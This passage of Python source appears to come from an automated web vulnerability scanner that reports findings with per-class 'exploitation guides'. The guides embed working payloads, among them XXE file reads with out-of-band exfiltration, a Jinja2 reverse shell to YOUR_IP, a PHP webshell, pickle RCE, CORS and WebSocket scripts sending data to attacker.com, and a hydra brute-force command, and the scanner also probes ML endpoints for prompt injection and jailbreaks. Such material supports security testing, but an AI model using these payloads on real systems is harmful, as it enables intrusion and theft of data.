                "total_tests": len(results) if results else 0,
                "vulnerabilities_found": len(findings),
                "tested_parameter": param_name
            }
        }
    
    async def _execute_xxe(
        self,
        target: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute XXE testing"""
        
        from app.modules.xxe import XXETester
        
        tester = XXETester(self.request_handler)
        
        results = await tester.test_xxe(
            url=target.url,
            headers=target.custom_headers or {}
        )
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description_parts = []
                description_parts.append("=== VULNERABILITY SUMMARY ===")
                description_parts.append(f"XXE Type: {result.xxe_type if hasattr(result, 'xxe_type') else 'Unknown'}")
                description_parts.append(f"Confidence: {int(result.confidence * 100)}%")
                description_parts.append("")
                
                description_parts.append("=== XXE EXPLOITATION GUIDE ===")
                description_parts.append("")
                description_parts.append("1. FILE DISCLOSURE:")
                description_parts.append("   <?xml version=\"1.0\"?>")
                description_parts.append("   <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>")
                description_parts.append("   <root><data>&xxe;</data></root>")
                description_parts.append("")
                
                description_parts.append("2. SSRF VIA XXE:")
                description_parts.append("   <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]>")
                description_parts.append("   <root><data>&xxe;</data></root>")
                description_parts.append("")
                
                description_parts.append("3. BLIND XXE (OOB):")
                description_parts.append("   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://YOUR_IP/evil.dtd\">%xxe;]>")
                description_parts.append("")
                description_parts.append("   evil.dtd content:")
                description_parts.append("   <!ENTITY % file SYSTEM \"file:///etc/passwd\">")
                description_parts.append("   <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP/?x=%file;'>\">")
                description_parts.append("   %eval;")
                description_parts.append("   %exfil;")
                description_parts.append("")
                
                description_parts.append("4. DENIAL OF SERVICE (BILLION LAUGHS):")
                description_parts.append("   <!DOCTYPE lolz [")
                description_parts.append("   <!ENTITY lol \"lol\">")
                description_parts.append("   <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">")
                description_parts.append("   <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">")
                description_parts.append("   ]>")
                description_parts.append("   <lolz>&lol2;</lolz>")
                
                if result.evidence:
                    description_parts.append("")
                    description_parts.append("=== EVIDENCE ===")
                    for evidence in result.evidence:
                        description_parts.append(f"• {evidence}")
                
                description = "\n".join(description_parts)
                
                proof_of_concept = f"Vulnerable URL: {target.url}\n\nXXE Payload:\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>"
                
                remediation = "1. Disable external entity processing\n2. Use less complex data formats (JSON)\n3. Update XML parsers\n4. Input validation\n5. Use SOAP 1.2 or higher\n6. Implement WAF rules"
                
                findings.append({
                    "vulnerability_type": "XML External Entity (XXE)",
                    "severity": "high",
                    "payload": result.payload if hasattr(result, 'payload') else "XXE payload",
                    "confidence": result.confidence,
                    "evidence": result.evidence if hasattr(result, 'evidence') else [],
                    "description": description,
                    "proof_of_concept": proof_of_concept,
                    "remediation": remediation
                })
        
        return {
            "status": "completed",
            "findings": findings,
            "summary": {
                "total_tests": len(results) if results else 0,
                "vulnerabilities_found": len(findings)
            }
        }
    
    async def _execute_ssti(
        self,
        target: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute SSTI testing"""
        
        from app.modules.ssti import SSTITester
        
        tester = SSTITester(self.request_handler)
        param_name = parameters.get("parameter", "template")
        
        results = await tester.test_ssti(
            url=target.url,
            parameter=param_name,
            headers=target.custom_headers or {}
        )
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                template_engine = result.template_engine if hasattr(result, 'template_engine') else "unknown"
                
                description_parts = []
                description_parts.append("=== VULNERABILITY SUMMARY ===")
                description_parts.append(f"Vulnerable Parameter: {result.parameter}")
                description_parts.append(f"Template Engine: {template_engine.upper()}")
                description_parts.append(f"Confidence: {int(result.confidence * 100)}%")
                description_parts.append(f"Confirmed Payload: {result.payload}")
                description_parts.append("")
                
                description_parts.append("=== SSTI EXPLOITATION GUIDE ===")
                description_parts.append("")
                
                if template_engine.lower() == "jinja2":
                    description_parts.append("JINJA2 EXPLOITATION:")
                    description_parts.append("   1. RCE: {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}")
                    description_parts.append("   2. File read: {{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}")
                    description_parts.append("   3. Reverse shell: {{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1').read()}}")
                elif template_engine.lower() == "freemarker":
                    description_parts.append("FREEMARKER EXPLOITATION:")
                    description_parts.append("   1. RCE: <#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }")
                    description_parts.append("   2. File read: ${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.io.FileReader\",\"/etc/passwd\").readLine()}")
                elif template_engine.lower() == "velocity":
                    description_parts.append("VELOCITY EXPLOITATION:")
                    description_parts.append("   1. RCE: #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('whoami'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end")
                else:
                    description_parts.append("GENERIC SSTI PAYLOADS:")
                    description_parts.append("   1. Detection: {{7*7}}, ${7*7}, <%= 7*7 %>")
                    description_parts.append("   2. RCE attempts based on detected engine")
                
                if result.evidence:
                    description_parts.append("")
                    description_parts.append("=== EVIDENCE ===")
                    for evidence in result.evidence:
                        description_parts.append(f"• {evidence}")
                
                description = "\n".join(description_parts)
                
                proof_of_concept = f"Vulnerable URL: {target.url}\nVulnerable Parameter: {result.parameter}\nTemplate Engine: {template_engine}\nPayload: {result.payload}"
                
                remediation = "1. Use logic-less templates\n2. Sandbox template execution\n3. Input validation\n4. Avoid user-controlled templates\n5. Use safe template engines\n6. Implement CSP"
                
                findings.append({
                    "vulnerability_type": "Server-Side Template Injection (SSTI)",
                    "severity": "critical",
                    "parameter": result.parameter,
                    "template_engine": template_engine,
                    "payload": result.payload,
                    "confidence": result.confidence,
                    "evidence": result.evidence if hasattr(result, 'evidence') else [],
                    "description": description,
                    "proof_of_concept": proof_of_concept,
                    "remediation": remediation
                })
        
        return {
            "status": "completed",
            "findings": findings,
            "summary": {
                "total_tests": len(results) if results else 0,
                "vulnerabilities_found": len(findings),
                "tested_parameter": param_name
            }
        }
    
    async def _execute_nosql_injection(
        self,
        target: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute NoSQL injection testing"""
        
        from app.modules.nosql_injection import NoSQLInjectionTester
        
        tester = NoSQLInjectionTester(self.request_handler)
        param_name = parameters.get("parameter", "username")
        
        results = await tester.test_nosql_injection(
            url=target.url,
            parameter=param_name,
            headers=target.custom_headers or {}
        )
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                db_type = result.database_type if hasattr(result, 'database_type') else "unknown"
                
                description_parts = []
                description_parts.append("=== VULNERABILITY SUMMARY ===")
                description_parts.append(f"Vulnerable Parameter: {result.parameter}")
                description_parts.append(f"Database: {db_type.upper()}")
                description_parts.append(f"Confidence: {int(result.confidence * 100)}%")
                description_parts.append(f"Confirmed Payload: {result.payload}")
                description_parts.append("")
                
                description_parts.append("=== NOSQL INJECTION EXPLOITATION ===")
                description_parts.append("")
                
                if db_type.lower() == "mongodb":
                    description_parts.append("MONGODB EXPLOITATION:")
                    description_parts.append("")
                    description_parts.append("1. AUTHENTICATION BYPASS:")
                    description_parts.append("   username[$ne]=admin&password[$ne]=pass")
                    description_parts.append("   {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}")
                    description_parts.append("")
                    description_parts.append("2. DATA EXTRACTION:")
                    description_parts.append("   username[$regex]=^a&password[$ne]=")
                    description_parts.append("   {\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$ne\": \"\"}}")
                    description_parts.append("")
                    description_parts.append("3. JAVASCRIPT INJECTION:")
                    description_parts.append("   username=admin&password[$where]=this.password.match(/^a/)")
                    description_parts.append("   {\"$where\": \"this.username == 'admin' || '1'=='1'\"}")
                else:
                    description_parts.append("GENERIC NOSQL PAYLOADS:")
                    description_parts.append("   1. {\"$ne\": null}")
                    description_parts.append("   2. {\"$gt\": \"\"}")
                    description_parts.append("   3. {\"$regex\": \".*\"}")
                
                if result.evidence:
                    description_parts.append("")
                    description_parts.append("=== EVIDENCE ===")
                    for evidence in result.evidence:
                        description_parts.append(f"• {evidence}")
                
                description = "\n".join(description_parts)
                
                proof_of_concept = f"Vulnerable URL: {target.url}\nVulnerable Parameter: {result.parameter}\nDatabase: {db_type}\nPayload: {result.payload}"
                
                remediation = "1. Use parameterized queries\n2. Input validation\n3. Type checking\n4. Disable JavaScript execution\n5. Principle of least privilege\n6. Use ORM/ODM"
                
                findings.append({
                    "vulnerability_type": "NoSQL Injection",
                    "severity": "high",
                    "parameter": result.parameter,
                    "database_type": db_type,
                    "payload": result.payload,
                    "confidence": result.confidence,
                    "evidence": result.evidence if hasattr(result, 'evidence') else [],
                    "description": description,
                    "proof_of_concept": proof_of_concept,
                    "remediation": remediation
                })
        
        return {
            "status": "completed",
            "findings": findings,
            "summary": {
                "total_tests": len(results) if results else 0,
                "vulnerabilities_found": len(findings),
                "tested_parameter": param_name
            }
        }
    
    async def _execute_jwt(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute JWT manipulation testing"""
        from app.modules.jwt_manipulation import JWTTester
        
        tester = JWTTester(self.request_handler)
        token = parameters.get("token", "")
        
        results = await tester.test_jwt(url=target.url, token=token, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
JWT Vulnerability: {result.vulnerability_type if hasattr(result, 'vulnerability_type') else 'JWT Manipulation'}
Confidence: {int(result.confidence * 100)}%

=== JWT EXPLOITATION GUIDE ===

1. ALGORITHM CONFUSION (alg: none):
   Change algorithm to "none" and remove signature
   Header: {{"alg": "none", "typ": "JWT"}}
   
2. ALGORITHM SWITCHING (RS256 to HS256):
   Change RS256 to HS256, sign with public key
   
3. KEY CONFUSION:
   Use known weak keys: secret, password, 123456
   
4. CLAIM MANIPULATION:
   Modify user_id, role, permissions in payload
   
5. TOOLS:
   jwt_tool: python3 jwt_tool.py TOKEN -T
   hashcat: hashcat -m 16500 jwt.txt wordlist.txt

=== EVIDENCE ===
• {result.evidence[0] if hasattr(result, 'evidence') and result.evidence else 'JWT vulnerability detected'}"""
                
                findings.append({
                    "vulnerability_type": "JWT Manipulation",
                    "severity": "high",
                    "description": description,
                    "proof_of_concept": f"Original Token: {token}\nModified claims or algorithm",
                    "remediation": "1. Use strong secret keys\n2. Validate algorithm\n3. Verify signature\n4. Check expiration\n5. Use RS256 instead of HS256"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_oauth(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute OAuth/SAML testing"""
        from app.modules.oauth_saml import OAuthTester
        
        tester = OAuthTester(self.request_handler)
        results = await tester.test_oauth(url=target.url, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
OAuth/SAML Vulnerability
Confidence: {int(result.confidence * 100)}%

=== OAUTH EXPLOITATION ===

1. REDIRECT_URI MANIPULATION:
   ?redirect_uri=https://attacker.com
   
2. STATE PARAMETER MISSING:
   CSRF attack on OAuth flow
   
3. OPEN REDIRECT:
   ?redirect_uri=https://victim.com@attacker.com
   
4. TOKEN LEAKAGE:
   Check Referer header for access_token

=== SAML EXPLOITATION ===

1. XML SIGNATURE WRAPPING:
   Modify SAML assertion after signature
   
2. XXE IN SAML:
   Inject XXE payload in SAML request"""
                
                findings.append({
                    "vulnerability_type": "OAuth/SAML Misconfiguration",
                    "severity": "high",
                    "description": description,
                    "remediation": "1. Validate redirect_uri\n2. Use state parameter\n3. Validate SAML signatures\n4. Disable XML external entities"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_csrf(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute CSRF testing"""
        from app.modules.csrf import CSRFTester
        
        tester = CSRFTester(self.request_handler)
        results = await tester.test_csrf(url=target.url, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
CSRF Vulnerability
Endpoint: {result.endpoint if hasattr(result, 'endpoint') else target.url}
Confidence: {int(result.confidence * 100)}%

=== CSRF EXPLOITATION ===

1. HTML FORM AUTO-SUBMIT:
   <form action="{target.url}" method="POST">
     <input name="email" value="attacker@evil.com">
   </form>
   <script>document.forms[0].submit()</script>
   
2. AJAX REQUEST:
   fetch('{target.url}', {{
     method: 'POST',
     credentials: 'include',
     body: 'email=attacker@evil.com'
   }})
   
3. IMG TAG (GET):
   <img src="{target.url}?action=delete&id=123">"""
                
                findings.append({
                    "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
                    "severity": "medium",
                    "description": description,
                    "remediation": "1. Use CSRF tokens\n2. SameSite cookies\n3. Verify Origin/Referer\n4. Re-authentication for sensitive actions"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_brute_force(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute brute force testing"""
        from app.modules.brute_force import BruteForceTester
        
        tester = BruteForceTester(self.request_handler)
        username = parameters.get("username", "admin")
        
        results = await tester.test_brute_force(url=target.url, username=username, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
Weak Credentials Detected
Username: {username}
Password: {result.password if hasattr(result, 'password') else 'Found'}

=== BRUTE FORCE TOOLS ===

1. HYDRA:
   hydra -l {username} -P passwords.txt {target.url} http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
   
2. BURP INTRUDER:
   Use Burp Intruder with password list
   
3. CUSTOM SCRIPT:
   for pwd in $(cat passwords.txt); do
     curl -d "username={username}&password=$pwd" {target.url}
   done"""
                
                findings.append({
                    "vulnerability_type": "Weak Credentials",
                    "severity": "high",
                    "description": description,
                    "remediation": "1. Strong password policy\n2. Account lockout\n3. Rate limiting\n4. CAPTCHA\n5. MFA"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_file_upload(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute file upload bypass testing"""
        from app.modules.file_upload_bypass import FileUploadTester
        
        tester = FileUploadTester(self.request_handler)
        results = await tester.test_file_upload(url=target.url, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
File Upload Bypass
Bypass Method: {result.bypass_method if hasattr(result, 'bypass_method') else 'Extension manipulation'}

=== FILE UPLOAD EXPLOITATION ===

1. EXTENSION BYPASS:
   shell.php.jpg, shell.php%00.jpg, shell.php%0a.jpg
   
2. CONTENT-TYPE BYPASS:
   Change Content-Type to image/jpeg
   
3. MAGIC BYTES:
   Add GIF89a or PNG header before PHP code
   
4. DOUBLE EXTENSION:
   shell.jpg.php (if server processes last extension)
   
5. WEBSHELL UPLOAD:
   <?php system($_GET['cmd']); ?>
   
6. ACCESS UPLOADED FILE:
   http://target.com/uploads/shell.php?cmd=whoami"""
                
                findings.append({
                    "vulnerability_type": "Unrestricted File Upload",
                    "severity": "critical",
                    "description": description,
                    "remediation": "1. Whitelist extensions\n2. Validate file content\n3. Rename uploaded files\n4. Store outside webroot\n5. Disable script execution in upload directory"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_directory_traversal(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute directory traversal testing"""
        from app.modules.directory_traversal import DirectoryTraversalTester
        
        tester = DirectoryTraversalTester(self.request_handler)
        param = parameters.get("parameter", "file")
        
        results = await tester.test_directory_traversal(url=target.url, parameter=param, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
Directory Traversal
Parameter: {param}
Payload: {result.payload}

=== DIRECTORY TRAVERSAL EXPLOITATION ===

1. BASIC PAYLOADS:
   ?{param}=../../../etc/passwd
   ?{param}=..\\..\\..\\windows\\win.ini
   
2. ENCODED PAYLOADS:
   ?{param}=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
   ?{param}=..%252f..%252f..%252fetc%252fpasswd
   
3. NULL BYTE:
   ?{param}=../../../etc/passwd%00.jpg
   
4. INTERESTING FILES:
   /etc/passwd, /etc/shadow, /proc/self/environ
   C:\\windows\\win.ini, C:\\boot.ini
   
5. APPLICATION FILES:
   ../../../var/www/html/config.php
   ../../../application/config/database.yml"""
                
                findings.append({
                    "vulnerability_type": "Directory Traversal",
                    "severity": "high",
                    "description": description,
                    "remediation": "1. Input validation\n2. Whitelist allowed files\n3. Use basename()\n4. Chroot jail\n5. Principle of least privilege"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_deserialization(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute deserialization testing"""
        from app.modules.deserialization import DeserializationTester
        
        tester = DeserializationTester(self.request_handler)
        results = await tester.test_deserialization(url=target.url, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
Insecure Deserialization
Language: {result.language if hasattr(result, 'language') else 'Unknown'}

=== DESERIALIZATION EXPLOITATION ===

1. PYTHON PICKLE RCE:
   import pickle, os
   class RCE:
     def __reduce__(self):
       return (os.system, ('whoami',))
   pickle.dumps(RCE())
   
2. JAVA DESERIALIZATION:
   Use ysoserial: java -jar ysoserial.jar CommonsCollections1 'whoami' | base64
   
3. PHP UNSERIALIZE:
   O:8:"Evil":1:{{s:4:"cmd";s:6:"whoami";}}
   
4. .NET DESERIALIZATION:
   Use ysoserial.net"""
                
                findings.append({
                    "vulnerability_type": "Insecure Deserialization",
                    "severity": "critical",
                    "description": description,
                    "remediation": "1. Avoid deserializing untrusted data\n2. Use safe formats (JSON)\n3. Implement integrity checks\n4. Use allowlists for classes"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_prototype_pollution(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute prototype pollution testing"""
        from app.modules.prototype_pollution import PrototypePollutionTester
        
        tester = PrototypePollutionTester(self.request_handler)
        results = await tester.test_prototype_pollution(url=target.url, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
Prototype Pollution
Confidence: {int(result.confidence * 100)}%

=== PROTOTYPE POLLUTION EXPLOITATION ===

1. BASIC PAYLOAD:
   {{"__proto__": {{"isAdmin": true}}}}
   
2. CONSTRUCTOR POLLUTION:
   {{"constructor": {{"prototype": {{"isAdmin": true}}}}}}
   
3. URL PARAMETER:
   ?__proto__[isAdmin]=true
   ?constructor[prototype][isAdmin]=true
   
4. DENIAL OF SERVICE:
   {{"__proto__": {{"toString": "DoS"}}}}
   
5. RCE (Node.js):
   {{"__proto__": {{"shell": "/bin/bash", "argv0": "console.log(require('child_process').execSync('whoami').toString())"}}}}"""
                
                findings.append({
                    "vulnerability_type": "Prototype Pollution",
                    "severity": "high",
                    "description": description,
                    "remediation": "1. Use Object.create(null)\n2. Freeze prototypes\n3. Input validation\n4. Use Map instead of objects"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_cors(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute CORS testing"""
        from app.modules.cors_exploitation import CORSTester
        
        tester = CORSTester(self.request_handler)
        results = await tester.test_cors(url=target.url, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
CORS Misconfiguration
Vulnerable Header: {result.header if hasattr(result, 'header') else 'Access-Control-Allow-Origin'}

=== CORS EXPLOITATION ===

1. STEAL DATA WITH CREDENTIALS:
   <script>
   fetch('{target.url}', {{
     credentials: 'include'
   }}).then(r => r.text()).then(data => {{
     fetch('http://attacker.com/?data=' + btoa(data))
   }})
   </script>
   
2. EXPLOIT WILDCARD ORIGIN:
   Origin: https://evil.com
   Server responds: Access-Control-Allow-Origin: *
   
3. NULL ORIGIN BYPASS:
   Origin: null
   (Works with file:// or sandboxed iframe)"""
                
                findings.append({
                    "vulnerability_type": "CORS Misconfiguration",
                    "severity": "medium",
                    "description": description,
                    "remediation": "1. Whitelist specific origins\n2. Avoid wildcard with credentials\n3. Validate Origin header\n4. Don't reflect Origin blindly"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_cache_poisoning(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute cache poisoning testing"""
        from app.modules.cache_poisoning import CachePoisoningTester
        
        tester = CachePoisoningTester(self.request_handler)
        results = await tester.test_cache_poisoning(url=target.url, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
Web Cache Poisoning
Unkeyed Header: {result.header if hasattr(result, 'header') else 'X-Forwarded-Host'}

=== CACHE POISONING EXPLOITATION ===

1. X-FORWARDED-HOST POISONING:
   X-Forwarded-Host: evil.com
   Cache will serve evil.com resources to all users
   
2. X-FORWARDED-SCHEME:
   X-Forwarded-Scheme: nothttps
   Force HTTP downgrade
   
3. CACHE KEY MANIPULATION:
   Use Param Miner to find unkeyed inputs"""
                
                findings.append({
                    "vulnerability_type": "Web Cache Poisoning",
                    "severity": "high",
                    "description": description,
                    "remediation": "1. Include all user input in cache key\n2. Validate forwarded headers\n3. Use cache-control headers properly"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_websocket(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute WebSocket testing"""
        from app.modules.websocket_sse import WebSocketTester
        
        tester = WebSocketTester(self.request_handler)
        results = await tester.test_websocket(url=target.url, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
WebSocket Vulnerability

=== WEBSOCKET EXPLOITATION ===

1. CROSS-SITE WEBSOCKET HIJACKING:
   <script>
   var ws = new WebSocket('ws://target.com/socket');
   ws.onmessage = function(e) {{
     fetch('http://attacker.com/?data=' + e.data)
   }}
   </script>
   
2. MESSAGE INJECTION:
   Send malicious JSON payloads
   
3. DENIAL OF SERVICE:
   Send large messages or rapid connections"""
                
                findings.append({
                    "vulnerability_type": "WebSocket Vulnerability",
                    "severity": "medium",
                    "description": description,
                    "remediation": "1. Validate Origin header\n2. Use authentication tokens\n3. Input validation\n4. Rate limiting"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_race_condition(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute race condition testing"""
        from app.modules.race_condition import RaceConditionTester
        
        tester = RaceConditionTester(self.request_handler)
        results = await tester.test_race_condition(url=target.url, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
Race Condition Vulnerability

=== RACE CONDITION EXPLOITATION ===

1. PARALLEL REQUESTS (Turbo Intruder):
   Send 100+ simultaneous requests
   
2. COUPON REUSE:
   Apply same coupon code multiple times simultaneously
   
3. DOUBLE SPENDING:
   Transfer money while balance check is happening"""
                
                findings.append({
                    "vulnerability_type": "Race Condition",
                    "severity": "high",
                    "description": description,
                    "remediation": "1. Use database transactions\n2. Implement locking\n3. Atomic operations\n4. Idempotency keys"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_api_testing(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute API testing"""
        from app.modules.api_testing import APITester
        
        tester = APITester(self.request_handler)
        results = await tester.test_api(url=target.url, headers=target.custom_headers or {})
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
API Security Issue
Type: {result.issue_type if hasattr(result, 'issue_type') else 'API Misconfiguration'}

=== API EXPLOITATION ===

1. MASS ASSIGNMENT:
   Add "isAdmin": true to request body
   
2. EXCESSIVE DATA EXPOSURE:
   API returns sensitive fields
   
3. BROKEN OBJECT LEVEL AUTHORIZATION:
   Change user_id in request to access other users' data
   
4. RATE LIMITING:
   Test for missing rate limits"""
                
                findings.append({
                    "vulnerability_type": "API Security Issue",
                    "severity": "medium",
                    "description": description,
                    "remediation": "1. Implement proper authorization\n2. Use DTOs for input/output\n3. Rate limiting\n4. Input validation"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_headless_browser(self, target: TargetConfig, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute headless browser testing"""
        from app.modules.headless_browser import HeadlessBrowserTester
        
        tester = HeadlessBrowserTester(self.request_handler)
        results = await tester.test_with_browser(url=target.url)
        
        findings = []
        for result in results:
            if result.is_vulnerable:
                description = f"""=== VULNERABILITY SUMMARY ===
Client-Side Vulnerability Detected

=== FINDINGS ===
{result.description if hasattr(result, 'description') else 'JavaScript-based vulnerability detected'}"""
                
                findings.append({
                    "vulnerability_type": "Client-Side Vulnerability",
                    "severity": "medium",
                    "description": description,
                    "remediation": "Review client-side code for security issues"
                })
        
        return {"status": "completed", "findings": findings}
    
    async def _execute_ml_exploitation(
        self,
        target: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute ML exploitation testing"""
        module = MLExploitationModule(self.request_handler)
        
        # 1. Detect ML endpoints
        endpoints = await module.detect_ml_endpoints(target)
        
        if not endpoints:
            # If endpoint provided in params, use that
            if "model_endpoint" in parameters:
                from app.modules.ml_exploitation import MLEndpoint, MLEndpointType
                endpoints = [MLEndpoint(
                    url=parameters["model_endpoint"],
                    endpoint_type=MLEndpointType.UNKNOWN
                )]
            else:
                return {
                    "status": "completed",
                    "findings": [],
                    "metadata": {"message": "No ML endpoints detected"}
                }
        
        all_findings = []
        
        # 2. Test each endpoint
        for endpoint in endpoints:
            # Prompt Injection
            findings = await module.prompt_injection_tester.test_prompt_injection(target, endpoint)
            all_findings.extend(findings)
            
            # Jailbreak
            findings = await module.prompt_injection_tester.test_jailbreak(target, endpoint)
            all_findings.extend(findings)
            
            # Model Inversion
            findings = await module.model_inversion_tester.test_model_inversion(target, endpoint)
            all_findings.extend(findings)
            
        # Convert findings to standard format
        formatted_findings = []
        for finding in all_findings:
            formatted_findings.append({
                "vulnerability_type": finding.vulnerability_type.value,
                "severity": finding.severity,
                "description": finding.description,
                "remediation": finding.remediation
            })
            
        return {
            "status": "completed",
            "findings": formatted_findings,
            "metadata": {
                "endpoints_scanned": len(endpoints),
                "vulnerabilities_found": len(all_findings)
            }
        }

    async def _execute_cms_scanner(
        self,
        target: TargetConfig,
        parameters: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute CMS scanner"""
        module = CMSScanner(self.request_handler)
        result = await module.scan(target)
        
        findings = []
        
        # Convert CMS vulnerabilities to standard findings
        for vuln in result.vulnerabilities:
            findings.append({
                "vulnerability_type": "CMS Vulnerability",
                "severity": vuln.severity,
                "description": f"{vuln.title}\n\n{vuln.description}",
                "remediation": f"Update to version {vuln.fixed_in}" if vuln.fixed_in else "Update component"
            })
            
        # Add config issues
        for issue in result.config_issues:
            findings.append({
                "vulnerability_type": "CMS Misconfiguration",
                "severity": "medium",
                "description": issue,
                "remediation": "Check CMS configuration"
            })
            
        return {
            "status": "completed",
            "findings": findings,
            "metadata": {
                "cms_type": result.cms_type,
                "version": result.version,
                "plugins_detected": len(result.plugins)
            }
        }

    async def close(self):
        """Close request handler"""
        await self.request_handler.close()
